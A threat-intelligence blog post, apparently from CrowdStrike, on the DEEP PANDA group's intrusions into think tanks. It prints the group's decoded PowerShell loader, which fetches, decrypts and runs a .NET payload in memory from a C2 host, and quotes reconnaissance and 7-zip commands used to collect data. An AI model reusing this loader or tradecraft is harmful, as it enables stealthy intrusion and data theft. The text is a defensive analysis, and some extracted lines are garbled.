    "plain_text": "### Deep in Thought: Chinese Targeting of National Security Think Tanks\n\nJuly 7, 2014 [Dmitri Alperovitch](http://www.crowdstrike.com/blog/author/dmitri/) [Executive Viewpoint](http://www.crowdstrike.com/blog/category/executive-viewpoint/)\n\nFor some time now, CrowdStrike has been working with a\n\nnumber of national security think tanks and human rights\n\norganizations on a pro bono basis to help them with their\n\nsecurity posture. These organizations face some of the most\n\nadvanced nation-state adversaries — China, Russia, and Iran,\n\njust to name a few. The individuals who are typically targeted at\n\nthese institutions tend to be former senior government officials\n\nwho still have lots of contacts within Western governments and,\n\nas such, their private correspondence is of extreme interest to\n\nthese attackers. The intelligence services of these nation states\n\nare always on the lookout for any clues they may extract from\n\nsuch private communications that may give them an advanced\n\ninsight into what options government policy makers are\n\nconsidering on particular issues of interest. At the same time,\n\nwith access to the victim email mailboxes, the adversaries can\n\n\n-----\n\ncontacts of targeted think tank personnel by piggybacking on\n\nongoing real conversations and increasing their chances of a\n\nsuccessful compromise of an official government email account.\n\nDespite this high threat level, these think tanks are organized as\n\nnon-profits and often do not have the budgets of commercial\n\norganizations to afford cutting-edge security technologies that\n\ncan help them effectively detect these threats. For this reason,\n\n[CrowdStrike has provided our Falcon Host endpoint security](http://www.crowdstrike.com/falcon-host/index.html)\n\ntechnology to many of these organizations at no charge to them\n\nto help detect and attribute these attackers on their networks in\n\nreal time, as well as to receive instantaneous full forensic\n\nvisibility into their behavior to help with full remediation of any\n\nincident.\n\nRecently, Falcon Host has detected multiple simultaneous\n\ncompromises at several national security think tanks from an\n\nactor we call DEEP PANDA, one of the most advanced Chinese\n\nnation-state cyber intrusion groups. For almost three years now,\n\nCrowdStrike has monitored DEEP PANDA targeting critical and\n\nstrategic business verticals including: government, defense,\n\nfinancial, legal, and the telecommunications industries. At the\n\nthink tanks, Falcon Host detected targeting of senior individuals\n\ninvolved in geopolitical policy issues, in particular in the\n\nChina/Asia Pacific region. However, last week the unprecedented\n\nreal-time visibility provided by Falcon Host into this actor’s\n\nescapades allowed analysts to observe a radical change in\n\ntargeting.\n\nThis actor, who was engaged in targeting and collection of\n\nSoutheast Asia policy information, suddenly began targeting\n\nindividuals with a tie to Iraq/Middle East issues. This is\n\nundoubtedly related to the recent Islamic State of Iraq and the\n\nLevant (ISIS) takeover of major parts of Iraq and the potential\n\ndisruption for major Chinese oil interests in that country. In fact,\n\nIraq happens to be the fifth-largest source of crude oil imports\n\nfor China and the country is the largest foreign investor in Iraq’s\n\noil sector. Thus, it wouldn’t be surprising if the Chinese\n\ngovernment is highly interested in getting a better sense of the\n\npossibility of deeper U.S. military involvement that could help\n\nprotect the Chinese oil infrastructure in Iraq. In fact, the shift in\n\n\n-----\n\n###### The Attacks\nCrowdStrike’s Falcon Host technology used by these think tanks\n\nconsists of a tiny (under 5mb in size) kernel sensor that is\n\ndeployed on Windows and Mac servers, desktops, and laptops\n\nand is able to do real-time detection and recording of all\n\nadversary activities taking place on the system. In addition, by\n\nmatching the detected activities against our vast Adversary\n\nIntelligence repository, Falcon Host can automatically attribute\n\nthe attack to a known adversary group and provide details about\n\ntheir motivations, capabilities, and key Tactics, Techniques, and\n\nProcedures (TTPs).\n\nRecently, we detected breaches of these networks via the use of\n\npowershell scripts deployed by the adversary as scheduled tasks\n\non Windows machines. The scripts are passed to the powershell\n\ninterpreter through the command line to avoid placement of\n\nextraneous files on the victim machine that could potentially\n\ntrigger AV- or Indicator of Compromise (IOC)-based detection.\n\nThe scripts were scheduled to call back every two hours to the\n\nDEEP PANDA Command and Control (C2) infrastructure.\n\nThe script in the command line is base64 encoded, but when\n\ndecoded it translates to the following code snippet:\n\n\n-----\n\n$wc = New Object TypeName System.Net.WebClient\n\n$wc.Headers.Add(“Accept­Language”, “en­\nUS,en;q=0.” + ([IntPtr]::Size – 1).ToString())\n$wc.Headers.Add(“User­Agent”, “Mozilla/5.0\n(compatible; MSIE 10.0; Windows NT 6.1; WOW64;\nTrident/6.0)”)\n$rndn = Get­Random\n$wc.Headers.Add(“Cookie”, “p=” + $rndn)\n$data =\n$wc.DownloadData(“https://<ANONYMIZED>/config/oauth/”)\n\n[string[]]$xags =\n“https://<ANONYMIZED>/config/login/”,\n“WMITool.Program”, “Main”, “/f”, “ssh”, “/s”,\n“<ANONYMIZED>”, “/p”, “443”\n$Passphrase = “<ANONYMIZED>”\n$salts = “<ANONYMIZED>”\n$r = new­Object\nSystem.Security.Cryptography.RijndaelManaged\n$pass =\n\n[System.Text.Encoding]::UTF8.GetBytes($Passphrase)\n$salt =\n\n[System.Text.Encoding]::UTF8.GetBytes($salts)\n$r.Key = (new­Object\nSecurity.Cryptography.PasswordDeriveBytes $pass,\n$salt, “SHA1”, 5).GetBytes(32) #256/8\n$r.IV = (new­Object\nSecurity.Cryptography.SHA1Managed).ComputeHash(\n\n[Text.Encoding]::UTF8.GetBytes($rndn) )[0..15]\n$d = $r.CreateDecryptor()\n$ms = new­Object IO.MemoryStream @(,$data)\n$cs = new­Object\nSecurity.Cryptography.CryptoStream $ms,$d,”Read”\n$dfs = New­Object\nSystem.IO.Compression.GzipStream $cs,\n([IO.Compression.CompressionMode]::Decompress)\n$msout = New­Object System.IO.MemoryStream\n\n[byte[]]$buffer = new­object byte[] 4096\n\n[int]$count = 0\ndo\n{\n$count = $dfs.Read($buffer, 0, $buffer.Length)\n$msout.Write($buffer, 0, $count)\n} while ($count ­gt 0)\n$dfs.Close()\n$cs.Close()\n$ms.Close()\n$r.Clear()\n\n[byte[]]$bin = $msout.ToArray()\n$al = New­Object ­TypeName\nSystem.Collections.ArrayList\n$al.Add($xags)\n$asm = [System.Reflection.Assembly]::Load($bin)\n$asm.EntryPoint.Invoke($null, $al.ToArray())\nsleep 5\nExit\nOnce executed, it downloads and executes from memory a .NET\n\nt bl (t i ll d W f ) hi h i t t i ll\n\n\n-----\n\none of the favorites of DEEP PANDA. By running them from\n\nmemory, it leaves no disk artifacts or host-based IOCs that can\n\nbe identified in forensic analysis. This is typical for DEEP PANDA\n\n— stealth is their specialty and they prefer to operate in a way\n\nthat leaves a minimal footprint on a victim system and often\n\nallows them to evade detection for a very long time.\n\nFor this same reason, DEEP PANDA likes to use webshells to keep\n\nlow-footprint persistent access to the victim network, as we’ve\n\n[covered in our prior blogs. This case was no exception, and that](http://www.crowdstrike.com/blog/mo-shells-mo-problems-deep-panda-web-shells/)\n\ninitial webshell implant allowed them to execute reconnaissance\n\ncommands such as “tasklist,” “net view,” and “net\n\nlocalgroup administrators,” and then afterward to deploy the\n\npowershell scripts.\n\nThe adversary used stolen credentials to mount network shares\n\nvia “net use” command. In one case, they brought in Cult of\n\nthe Dead Cow’s NetE tool onto the system, but most of the time\n\nthey leveraged existing Windows tools and avoided bringing\n\nmany new tools into the environment that could make them\n\nnoisy and easily detectable by technologies that scan for static\n\nIOCs.\n\nAfter using compromised credentials to mount file shares, the\n\nadversary was seen compressing data using 7-zip. They were\n\nadding different document types to compressed files by\n\nwildcarding the extensions, such as:\n\n“C:Program Files7­Zip7z” a setup1.log ­r ­pkkk***\n“\\<share name>users<UserName>*rtf *doc”\n“C:Program Files7­Zip7z” a setup1.log ­r ­pkkk***\n\n“\\<share name>users<UserName>*ppt”\n\nThey knew exactly which users to target based on their research\n\npolicy area, and they rapidly pivoted from China/Asia Pacific\n\npolicy experts to Iraq/Middle East policy experts once their\n\ntasking collection requirements changed.\n\n\n-----\n\nAggressive Use of Ping to Determine Which Machines of Interest\n\nare Online\n\nOn one of the compromised machines, the adversary brought in\n\na command-line version of RAR archiver that was named\n\n“cftmon.exe” and placed it into “c:windowstemphotfix”\n\ndirectory. The files were encrypted (both file data and headers)\n\nwith “uinfw” password and the archive files were named after\n\nthe initials of each user that had been targeted and stored in the\n\nsame “c:windowstemphotfix” directory.\n\nFor lateral movement, they used WMI to deploy the powershell\n\nscripts remotely and setup scheduled tasks on the remote\n\nsystems.\n\n##  BLOG\n\nDespite the fact that we were seeing nearly identical TTPs used\n\nacross multiple think-tank targets there is evidence to indicate\n\n\n##  BLOG\n\n\n-----\n\nkeyboard based on the intricacies of how certain powershell\n\ncommand lines had been used in each case.\n\n###### Summary\nDEEP PANDA presents a very serious threat not just to think\n\ntanks, but also multinational financial institutions, law firms,\n\ndefense contractors, and government agencies. Due to their\n\nstellar operational security and reliance on anti-forensic and\n\nanti-IOC detection techniques, detecting and stopping them is\n\nvery challenging without the use of next-generation endpoint\n\ntechnology like Falcon Host. Not only was Falcon Host able to\n\ndetect this adversary without relying on static signatures or\n\nIOCs, but it was able to provide instantaneous and full forensic\n\nanalysis of what had occurred on each of the compromised\n\nendpoints without the need to pull hard drives and do costly and\n\ntime-intensive forensics, substantially reducing the time needed\n\nfor remediation.\n\nIf you are a non-profit think tank or a human rights organization\n\nthat would like to take advantage of our no-charge offer of Falcon\n\nHost licenses for your servers and desktops, please email us at\n\n[sales@crowdstrike.com with the subject “Non-Profit Falcon](mailto:sales@crowdstrike.com)\n\nHost Offer.”\n\nOur Falcon Intelligence subscribers have had access to multiple\n\nreports on the DEEP PANDA actor that includes full analysis of\n\ntheir attribution, tradecraft and TTPs, as well as detection\n\nindicators and signatures and remediation instructions. And our\n\n[CrowdStrike Services has worked on multiple intrusion](http://services.crowdstrike.com/)\n\ninvestigations related to DEEP PANDA in the last year.
